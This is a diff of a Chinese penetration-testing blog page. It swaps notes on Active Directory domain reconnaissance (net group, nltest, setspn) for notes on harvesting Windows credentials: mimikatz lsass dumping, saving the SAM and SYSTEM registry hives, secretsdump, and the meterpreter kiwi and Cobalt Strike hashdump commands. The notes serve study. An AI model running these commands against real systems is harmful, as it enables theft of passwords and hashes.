@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="域学习笔记, budtit&#39;blog">
+    <meta name="keywords" content="windows密码凭证获取1, budtit&#39;blog">
     <meta name="description" content="因为迷茫，所以滞留；因为迷茫，所以错过。">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>域学习笔记 | budtit&#39;blog</title>
+    <title>windows密码凭证获取1 | budtit&#39;blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -203,12 +203,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/5.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/8.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">域学习笔记</h1>
+                    <h1 class="description center-align post-title">windows密码凭证获取1</h1>
                 </div>
             </div>
         </div>
@@ -328,8 +328,8 @@
                                 <span class="chip bg-color">渗透测试</span>
                             </a>
                         
-                            <a href="/tags/windows/">
-                                <span class="chip bg-color">windows</span>
+                            <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                <span class="chip bg-color">笔记</span>
                             </a>
                         
                     </div>
@@ -353,7 +353,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-02-06
+                    2021-02-22
                 </div>
                 
 
@@ -362,7 +362,7 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    874
+                    447
                 </div>
                 
 
@@ -387,58 +387,45 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <a id="more"></a>
-<h2 id="域的基本概念"><a href="#域的基本概念" class="headerlink" title="域的基本概念"></a>域的基本概念</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域是windows的网络操作系统的安全边界，域内主机各种策略由域控制器统一设定，域中所有主机共享一个集中式的目录数据库，包含着整个域内的对象。父域和子域之间构成域树，多个域树构成域林，林中的第一个被创建的域，作为该林的根域。windows NT中，名称空间是平行的，尽管可以将NT域配置为彼此信任，但每个域都是一个完全独立的实体。<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;域成员计算机在登录的时候可以选择登录到域中或此计算机。登陆到域中的时候，身份验证是采用Kerberos协议在域控制器上进行的，而登陆到此计算机时，是通过SAM来进行NTLM验证的。默认情况下，域用户可以登录到域中所有的工作站，不包括域控制器，管理员也可以指定具体的计算机，域用户信息保存在活动目录中。</p>
-<h2 id="域控DC-Domain-Control"><a href="#域控DC-Domain-Control" class="headerlink" title="域控DC(Domain Control)"></a>域控DC(Domain Control)</h2><p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;在域架构中域控是用来管理所有客户端的服务器，它负责每一台联入的电脑和用户的验证工作，域内电脑如果想互相访问首先都得经过它的审核。 域控是域架构的核心，每个域控制器上都包含了AD活动目录数据库。一个域中可能要有至少两个域控。一个作为DC，一个是备份DC。</p>
-<h2 id="常用的域信息收集"><a href="#常用的域信息收集" class="headerlink" title="常用的域信息收集"></a>常用的域信息收集</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">### net组件</span>
-<span class="token comment">#查询域</span>
-net view /domain
-<span class="token comment">#查询域内的所有计算机</span>
-net view /domain:de1ay
-<span class="token comment">#查询域内所有用户组（Enterprise Admins组权限最大）</span>
-net group /domain
-<span class="token comment">#查看域管理员的用户组</span>
-net group <span class="token string">"domain admins"</span> /domain
-<span class="token comment">#查询所有域成员计算机列表</span>
-net group <span class="token string">"domain computers"</span> /domain
-<span class="token comment">#查询域系统管理员用户组</span>
-net group <span class="token string">"Enterprise admins"</span> /domain
-<span class="token comment">#查看域控制器</span>
-net group <span class="token string">"domain controllers"</span> /domain
-<span class="token comment">#对比查看"工作站域DNS名称(域名)"和"登录域()域控制器"的信息是否相匹配</span>
-net config workstation
-<span class="token comment">#查看域内所有账号</span>
-net user /domain
-<span class="token comment">#查询指定用户的详情信息</span>
-net user xxx /domain
-<span class="token comment">#查看时间可以找到域控</span>
-net <span class="token function">time</span> /domain
-查看域密码策略
-net accounts /domain
-<span class="token comment">#查看当前登录域</span>
-net config workstation
-<span class="token comment">#登录本机的域管理员</span>
-net localgroup administrators /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<h2 id="定位域控"><a href="#定位域控" class="headerlink" title="定位域控"></a>定位域控</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ipconfig
-ipconfig /all
-<span class="token comment">#查询dns解析记录</span>
-<span class="token function">nslookup</span> -type<span class="token operator">=</span>all _ldap._tcp.dc._msdcs.mingy.com
-<span class="token comment">#spn扫描</span>
-在SPN扫描结果中可以通过如下内容，来进行域控的定位。
-setspn -q */*
-setspn -T mingy.com -q */*
-<span class="token assign-left variable">CN</span><span class="token operator">=</span>DC,OU<span class="token operator">=</span>Domain Controllers,DC<span class="token operator">=</span>mingy,DC<span class="token operator">=</span>com
-net group
-net group <span class="token string">"domain controllers"</span> /domain<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>可以通过端口来识别域控<br>端口：389<br>服务：LDAP、ILS<br>说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。<br>端口：53<br>服务：Domain Name Server（DNS）<br>说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。   </p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#查看域内信任关系</span>
-nltest /domain_trusts
-<span class="token comment">#查看域控制器的机器名</span>
-nltest /DCLIST:MINGY
-<span class="token comment">#查看域内邮件服务器</span>
-<span class="token function">nslookup</span> -q<span class="token operator">=</span>mx mingy.com
-<span class="token comment">#查看域内DNS服务器</span>
-<span class="token function">nslookup</span> -q<span class="token operator">=</span>ns mingy.com<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+                <p>学习笔记</p>
+<a id="more"></a>
+
+<h2 id="windows本地认证"><a href="#windows本地认证" class="headerlink" title="windows本地认证"></a>windows本地认证</h2><ol>
+<li>用户输入密码</li>
+<li>系统收到密码后将用户输入的密码计算为NTLM hash</li>
+<li>与sam数据库中该用户的hash进行对比</li>
+<li>相同则登陆成功，不相同则登陆失败</li>
+</ol>
+<p>本地认证中用来处理用户输入密码的进程为lsass.exe密码会在这个进程中明文保存，供该进程将密码计算成NTLM Hash与sam进行对比，我们使用mimikatz来获取的明文密码，便是这个进程中读到的。</p>
+<h2 id="获取凭证的姿势"><a href="#获取凭证的姿势" class="headerlink" title="获取凭证的姿势"></a>获取凭证的姿势</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>privilege::debug  //提升权限<br>inject::process lsass.exe sekurlsa.dll //注入sekurlas.dll到lsass.exe进程里<br>sekurlsa::logonpasswords //获取密码</p>
+<h3 id="powershell脚本"><a href="#powershell脚本" class="headerlink" title="powershell脚本"></a>powershell脚本</h3><p>这种方法的优点是无文件落地.</p>
+<p>powershell远程加载minikatz<br>powershell加载Get-PassHashes脚本</p>
+<h3 id="pwdump7"><a href="#pwdump7" class="headerlink" title="pwdump7"></a>pwdump7</h3><h3 id="Ophcrack"><a href="#Ophcrack" class="headerlink" title="Ophcrack"></a>Ophcrack</h3><p>用于解密哈希<br><a target="_blank" rel="noopener" href="https://www.objectif-securite.ch/ophcrack">https://www.objectif-securite.ch/ophcrack</a></p>
+<h3 id="Procdump-mimikatz联合"><a href="#Procdump-mimikatz联合" class="headerlink" title="Procdump + mimikatz联合"></a>Procdump + mimikatz联合</h3><p>使用procdump lsass进程导出，再用miniikatz还原密码 </p>
+<h3 id="注册表导出hash"><a href="#注册表导出hash" class="headerlink" title="注册表导出hash"></a>注册表导出hash</h3><pre class="line-numbers language-none"><code class="language-none">reg save HKLM\SYSTEM system.hiv
+reg save HKLM\SAM sam.hiv
+reg save HKLM\SECURITY security.hiv<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>导出后可以试用cain导出system.hiv、security.hiv获取缓存中的明文信息。</p>
+<pre class="line-numbers language-none"><code class="language-none">mimikatz.exe &quot;lsadump::sam &#x2F;system:system.hiv &#x2F;sam:sam.hiv&quot; exit
+python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<h3 id="LaZagne"><a href="#LaZagne" class="headerlink" title="LaZagne"></a>LaZagne</h3><p><a target="_blank" rel="noopener" href="https://github.com/AlessandroZ/LaZagne">https://github.com/AlessandroZ/LaZagne</a></p>
+<h3 id="meterpreter获取Hash"><a href="#meterpreter获取Hash" class="headerlink" title="meterpreter获取Hash"></a>meterpreter获取Hash</h3><pre class="line-numbers language-none"><code class="language-none">use post&#x2F;windows&#x2F;gather&#x2F;hashdump 
+set sesion 1
+exploiit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>Hashdump使用的是mimikatz的部分功能<br>Load mimikatz<br>获取用户密码的hash值<br>wdigest 、kerberos 、msv 、ssp 、tspkg 、livessp<br>mimikatz_command -h<br>mimikatz_command -f :: //查询有哪些模块<br>mimikatz_command -f samdump::hashes //从windows的sam文件中读取密码hash值<br>mimikatz_command -f sekurlsa::searchPasswords //获取明文密码<br>mimikatz_command -f samdump::bootkey</p>
+<p>msf6：</p>
+<pre class="line-numbers language-none"><code class="language-none">meterpreter &gt;load kiwi
+meterpreter &gt; help kiwi
+列举系统中的明文密码
+meterpreter &gt; creds_all
+读取sam文件
+meterpreter &gt; lsa_dump_sam
+kiwi_cmd命令后面接mimikatz.exe的命令
+meterpreter &gt; kiwi_cmd sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<h3 id="cs获取Hash"><a href="#cs获取Hash" class="headerlink" title="cs获取Hash"></a>cs获取Hash</h3><p>主机上线后获取hash</p>
+<pre class="line-numbers language-none"><code class="language-none">beacon&gt; hashdump
+beacon&gt; logonpasswords
+beacon&gt; mimikatz sekurlsa::logonpasswords<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
                 
             </div>
             <hr/>
@@ -456,8 +443,8 @@ nltest /DCLIST:MINGY
                                     <span class="chip bg-color">渗透测试</span>
                                 </a>
                             
-                                <a href="/tags/windows/">
-                                    <span class="chip bg-color">windows</span>
+                                <a href="/tags/%E7%AC%94%E8%AE%B0/">
+                                    <span class="chip bg-color">笔记</span>
                                 </a>
                             
                         </div>
@@ -503,9 +490,10 @@ nltest /DCLIST:MINGY
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/2021/windows%E5%AF%86%E7%A0%81%E5%87%AD%E8%AF%81%E8%8E%B7%E5%8F%96/">
                     <div class="card-image">
@@ -523,9 +511,9 @@ nltest /DCLIST:MINGY
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-02-22
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-02-22
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -538,6 +526,7 @@ nltest /DCLIST:MINGY
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -560,19 +549,19 @@ nltest /DCLIST:MINGY
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2021/%E4%B8%BB%E6%9C%BA%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
+                <a href="/2021/%E5%9F%9F%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/21.jpg" class="responsive-img" alt="主机信息收集">
+                        <img src="/medias/featureimages/5.jpg" class="responsive-img" alt="域学习笔记">
                         
-                        <span class="card-title">主机信息收集</span>
+                        <span class="card-title">域学习笔记</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
                     <div class="summary block-with-text">
                         
-                            学习笔记
+                            
                         
                     </div>
                     <div class="publish-info">
@@ -598,8 +587,8 @@ nltest /DCLIST:MINGY
                         <span class="chip bg-color">渗透测试</span>
                     </a>
                     
-                    <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                        <span class="chip bg-color">信息收集</span>
+                    <a href="/tags/windows/">
+                        <span class="chip bg-color">windows</span>
                     </a>
                     
                 </div>
